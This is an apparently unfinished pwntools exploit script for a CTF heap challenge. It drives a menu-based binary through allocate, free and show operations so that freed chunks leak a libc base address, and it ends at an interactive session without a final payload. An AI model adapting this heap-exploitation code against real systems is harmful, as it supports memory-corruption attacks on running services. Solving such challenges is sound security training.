from pwn import * 
from pwn import p64,u64
from LibcSearcher import *

debug = 1
gdb_is = 1
elf_path = "./pwn"
# context(arch='i386',os = 'linux')
context(arch='amd64',os = 'linux', log_level='DEBUG')
if debug:
    context.terminal = ['wt.exe','nt','Ubuntu','-c']
    if gdb_is:
        # r = gdb.debug(elf_path,'set debug-file-directory ./.debug/')
        # gdb.attach(r,'b* 0x4012ed')
        r = process(elf_path)
        gdb.attach(r)
        # pause()
        pass
    else:
        r = process(elf_path)
    
else:
    host = "192.168.0.111:53783"
    r = connect(host.split(':')[0],host.split(':')[1])#远程连接
    gdb_is =0



def show_addr(name,addr):
      success(f'{name} = {hex(addr)}')

def revc_addr(name:str, until:bytes =b'\x7f',offset:int = 0,addrType:str = 'bytes')->int:
    if type(until) == str:
        until = until.encode()
    if addrType == 'bytes':
        if not offset:
            addr = u64(r.recvuntil(until).ljust(8,b'\x00'))
        else:
            addr = u64(r.recvuntil(until)[:offset].ljust(8,b'\x00'))
    elif addrType == 'str':
        addr = int(r.recvuntil(until)[2:offset].decode(),16)

    show_addr(name,addr)
    return addr


elf = ELF(elf_path)
rop = ROP(elf)

def menu(num):
    r.sendlineafter(b'>> \n',str(num).encode())

def add(size,context):
    menu(2)
    # 0xF <= Size <= 0x500
    r.sendlineafter(b'budget.\n',str(size).encode())
    r.sendlineafter(b'Content: \n',context)
    
def load(index):
    menu(3)
    r.sendlineafter(b'whitch one do you want to load\n',str(index).encode())

def show(index):
    menu(1)
    r.sendlineafter(b'Do you want to take a few pictures?\n',str(index).encode())

for i in range(8):
    add(0x80,b'Z'*0x80) #0 - 7

add(0x80,b'A'*0x80) # 8
add(0x80,b'B'*0x80) # 9



load(3)
load(2)
load(1)
load(0)
load(9)
load(8)
load(7)
load(6)
load(5)
load(4)


show(10)

add(0x80,b'C'*0x80)



load(0)
show(2)
libc = ELF('./libc.so.6')
r.recvuntil(b'Over!!!!!\nThe film content: ')
libc.addr = revc_addr('main_neara') - 0x1ecbe0
show_addr('libc.addr',libc.addr)




r.interactive()